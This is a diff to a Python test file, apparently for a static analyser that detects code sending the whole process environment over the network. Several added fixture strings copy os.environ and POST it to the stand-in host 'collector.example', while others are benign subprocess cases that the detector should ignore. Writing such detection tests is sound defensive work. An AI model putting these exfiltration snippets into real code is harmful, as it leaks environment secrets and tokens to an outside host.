@@ -192,7 +192,51 @@ WHOLE = {
         token = env.get("TOKEN")
         requests.post("https://collector.example/x", json={"t": token, "all": env.copy()})
     """,
+    "an unknown builder given the environment by env= keyword": """
+        import os, requests
+        from somewhere import build
+        report = build(env=os.environ.copy())
+        requests.post("https://collector.example/x", data=report)
+    """,
+    "a non-spawn sender given env=dict(os.environ)": """
+        import os, json, requests
+        def report(url, env=None):
+            return requests.post(url, data=json.dumps(env))
+        report("https://collector.example/x", env=dict(os.environ))
+    """,
+    "a non-spawn sender given a held copy by env=": """
+        import os, json, requests
+        def report(url, env=None):
+            return requests.post(url, data=json.dumps(env))
+        env = os.environ.copy()
+        env["X"] = "1"
+        report("https://collector.example/x", env=env)
+    """,
 }
+
+CHILD_ONLY = {
+    "subprocess.run imported bare": """
+        import os, requests
+        from subprocess import run
+        env = os.environ.copy()
+        env["LANG"] = "C"
+        run(["make"], env=env)
+        requests.get("https://example.org/status")
+    """,
+    "Popen imported bare, the copy written into env=": """
+        import requests
+        from os import environ
+        from subprocess import Popen
+        Popen(["serve"], env=dict(environ, PORT="8000"))
+        requests.get("http://127.0.0.1:8000/health")
+    """,
+}
+
+
+class TestAChildsEnvironment:
+    @pytest.mark.parametrize("name", sorted(CHILD_ONLY))
+    def test_env_of_a_spawned_child_is_not_sent(self, name: str) -> None:
+        assert EnvironmentKeyedHelpers.sent(CHILD_ONLY[name]) == []
 
 
 class TestOneSettingIsNotTheEnvironment:
@@ -205,20 +249,3 @@ class TestTheWholeEnvironmentStillFires:
     @pytest.mark.parametrize("name", sorted(WHOLE))
     def test_every_variable_sent_is_still_found(self, name: str) -> None:
         assert EnvironmentKeyedHelpers.sent(WHOLE[name]), name
-
-    @pytest.mark.xfail(
-        strict=True,
-        reason=(
-            "Known gap, older than this change (missed at e81fe563 too): "
-            "`_environment_handed_to_children` takes every `env=` keyword for a child process's "
-            "environment, so a non-spawn callee given `env=os.environ.copy()` is not followed."
-        ),
-    )
-    def test_an_unknown_builder_given_env_by_keyword(self) -> None:
-        source = """
-            import os, requests
-            from somewhere import build
-            report = build(env=os.environ.copy())
-            requests.post("https://collector.example/x", data=report)
-        """
-        assert EnvironmentKeyedHelpers.sent(source)
